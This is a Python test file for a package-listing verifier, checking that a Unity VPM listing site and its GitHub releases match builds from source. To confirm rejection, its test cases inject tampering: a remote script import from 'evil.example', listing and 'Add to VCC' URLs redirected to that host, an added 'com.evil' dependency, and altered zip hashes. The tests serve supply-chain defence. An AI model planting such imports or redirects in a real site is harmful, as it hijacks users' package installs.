"""Offline checks of scripts/verify_listing.py against synthetic Pages artifacts.

Run: SOURCE=<full clone of Rionquosue/riryunityworkflow with origin/main> python3 tests/test_verify_listing.py
Release data for v0.7.0 is recorded below, so no network is needed. v0.7.1 is an
auto-bumped release of source origin/main, built here with this checkout's
package.json template, which must be committed (HEAD stands in for main).
"""
import contextlib
import io
import json
import os
import subprocess
import sys
import tarfile
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "scripts"))
import verify_listing as vl  # noqa: E402

RELEASE_070 = json.loads(r'''{"assets":[{"digest":"sha256:c024bbf84dc504d985fff967bbaa35e97ada4bf9b263d9656f3025e5eca0a25a","name":"com.riry.rirytools-0.7.0.zip","uploader":{"login":"github-actions[bot]"}},{"digest":"sha256:4dcf25c3a42a66dc72e719a2529a8c84f6807946d5a4b6cde88f5efb53f5894c","name":"package.json","uploader":{"login":"github-actions[bot]"}}],"author":{"login":"github-actions[bot]"},"body":"Built from Rionquosue/riryunityworkflow@c8009c0.","draft":false,"prerelease":false,"tag_name":"v0.7.0","target_commitish":"main"}''')
SOURCE = os.environ.get("SOURCE")
if not SOURCE:
    sys.exit("Set SOURCE to a full clone of Rionquosue/riryunityworkflow.")
vl.MAIN = "HEAD"
vl.deployed_listing = lambda: None
src = json.load(open(vl.SOURCE_JSON, encoding="utf-8"))
SHA = "c024bbf84dc504d985fff967bbaa35e97ada4bf9b263d9656f3025e5eca0a25a"
URL = "https://github.com/Rionquosue/rirytools_vpm/releases/download/v0.7.0/com.riry.rirytools-0.7.0.zip"
URL_071 = "https://github.com/Rionquosue/rirytools_vpm/releases/download/v0.7.1/com.riry.rirytools-0.7.1.zip"
work = tempfile.mkdtemp()


def git(directory, *args):
    return subprocess.run(["git", "-C", directory] + list(args), capture_output=True, text=True, check=True).stdout.strip()


# v0.7.1: source origin/main built as 0.7.1 with the template at HEAD, as build-package.yml does.
SOURCE_MAIN, VPM_HEAD = git(SOURCE, "rev-parse", "origin/main"), git(vl.ROOT, "rev-parse", "HEAD")
tree = os.path.join(work, "tree")
git(SOURCE, "worktree", "add", "--detach", tree, SOURCE_MAIN)
subprocess.run([sys.executable, "-I", os.path.join(vl.HERE, "build_vpm.py"), "build", "--source", tree, "--version", "0.7.1",
                "--repository", vl.REPOSITORY, "--dist", os.path.join(work, "dist")], check=True, capture_output=True,
               env=dict(os.environ, GITHUB_OUTPUT=os.devnull))
git(SOURCE, "worktree", "remove", "--force", tree)
SHA_071 = vl.hashlib.sha256(open(os.path.join(work, "dist", "com.riry.rirytools-0.7.1.zip"), "rb").read()).hexdigest()
RELEASE_071 = {"assets": [{"digest": "sha256:" + SHA_071, "name": "com.riry.rirytools-0.7.1.zip", "uploader": {"login": "github-actions[bot]"}},
                          {"digest": "sha256:" + "1" * 64, "name": "package.json", "uploader": {"login": "github-actions[bot]"}}],
               "author": {"login": "github-actions[bot]"}, "draft": False, "prerelease": False, "tag_name": "v0.7.1", "target_commitish": "main",
               "body": "Built from Rionquosue/riryunityworkflow@%s with Rionquosue/rirytools_vpm@%s." % (SOURCE_MAIN, VPM_HEAD)}
RELEASES = {"v0.7.0": RELEASE_070, "v0.7.1": RELEASE_071}
vl.release = lambda tag: RELEASES.get(tag)

# The rebuilt package.json for each version, which the listing entry must match.
_, PACKAGE = vl.rebuild(SOURCE, RELEASE_070, "com.riry.rirytools-0.7.0.zip", "0.7.0")
_, PACKAGE_071 = vl.rebuild(SOURCE, RELEASE_071, "com.riry.rirytools-0.7.1.zip", "0.7.1")


def render(text):
    return text.replace("{{ listingInfo.Url }}", src["url"]).replace("{{listingInfo.Url}}", src["url"])


def listing(entry=None, bumped=None, **changes):
    version = dict(PACKAGE, url=URL, zipSHA256=SHA)
    version.update(entry or {})
    versions = {"0.7.0": version}
    if bumped is not None:
        versions["0.7.1"] = dict(dict(PACKAGE_071, url=URL_071, zipSHA256=SHA_071), **bumped)
    data = {"name": src["name"], "id": src["id"], "url": src["url"], "author": src["author"]["name"],
            "packages": {"com.riry.rirytools": {"versions": versions}}}
    data.update(changes)
    return json.dumps(data).encode()


BASE = []
for name in sorted(os.listdir(vl.WEBSITE)):
    data = open(os.path.join(vl.WEBSITE, name), "rb").read()
    BASE.append((name, render(data.decode()).encode() if name in vl.TEMPLATED else data))


def verify(files):
    path = os.path.join(work, "artifact.tar")
    with tarfile.open(path, "w") as archive:
        for name, data in files:
            info = tarfile.TarInfo("./" + name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    sys.argv = ["verify_listing.py", "--artifact", path, "--source", SOURCE]
    with contextlib.redirect_stdout(io.StringIO()):
        return vl.main()


def check_release(tag, release=None):
    if release is not None:
        RELEASES[tag] = release
    sys.argv = ["verify_listing.py", "--release", tag, "--source", SOURCE]
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            return vl.main()
    finally:
        RELEASES["v0.7.1"] = RELEASE_071


def edited(target, change):
    return [(n, change(d) if n == target else d) for n, d in BASE]


CASES = [
    ("clean site passes", 0, BASE + [("index.json", listing())]),
    ("empty default fields pass", 0, BASE + [("index.json", listing({"legacyFolders": {}, "samples": []}))]),
    ("extra file", 1, BASE + [("index.json", listing()), ("evil.js", b"x")]),
    ("duplicate entry", 1, BASE + [("index.json", listing()), ("index.json", b"{}")]),
    ("extra module import", 1, edited("app.js", lambda d: d + b"\nimport x from 'https://evil.example/x.js';") + [("index.json", listing())]),
    ("static file changed", 1, edited("styles.css", lambda d: d + b" ") + [("index.json", listing())]),
    ("listing url changed", 1, BASE + [("index.json", listing(url="https://evil.example/index.json"))]),
    ("legacyFolders added", 1, BASE + [("index.json", listing({"legacyFolders": {"Assets": ""}}))]),
    ("dependency added", 1, BASE + [("index.json", listing({"vpmDependencies": {"com.evil": "1.0.0"}}))]),
    ("unknown link added", 1, edited("index.html", lambda d: d.replace(b"</body>", b'<a href="https://evil.example">x</a></body>')) + [("index.json", listing())]),
    ("Add to VCC redirected", 1, edited("app.js", lambda d: d.replace(src["url"].encode(), b"https://evil.example/index.json")) + [("index.json", listing())]),
    ("zip hash changed", 1, BASE + [("index.json", listing({"zipSHA256": "0" * 64}))]),
    ("auto-bumped version passes", 0, BASE + [("index.json", listing(bumped={}))]),
    ("auto-bumped zip hash changed", 1, BASE + [("index.json", listing(bumped={"zipSHA256": "0" * 64}))]),
    ("auto-bumped version field changed", 1, BASE + [("index.json", listing(bumped={"version": "0.7.0"}))]),
]
RELEASE_CASES = [
    ("release v0.7.0 passes", 0, "v0.7.0", None),
    ("auto-bumped release v0.7.1 passes", 0, "v0.7.1", None),
    ("auto-bumped release with another zip", 1, "v0.7.1", dict(RELEASE_071, assets=[dict(RELEASE_071["assets"][0], digest="sha256:" + "0" * 64), RELEASE_071["assets"][1]])),
    ("auto-bumped release with an unknown template commit", 1, "v0.7.1", dict(RELEASE_071, body=RELEASE_071["body"].replace(VPM_HEAD, "0" * 40))),
    ("release not made by the build", 1, "v0.7.1", dict(RELEASE_071, author={"login": "someone"})),
    ("missing release", 1, "v0.7.2", None),
]
results = []
for name, expected, tag, release in RELEASE_CASES:
    ok = check_release(tag, release) == expected
    results.append(ok)
    print(("PASS " if ok else "FAIL ") + name)
for name, expected, files in CASES:
    ok = verify(files) == expected
    results.append(ok)
    print(("PASS " if ok else "FAIL ") + name)
print("\n%d/%d passed" % (sum(results), len(results)))
sys.exit(0 if all(results) else 1)
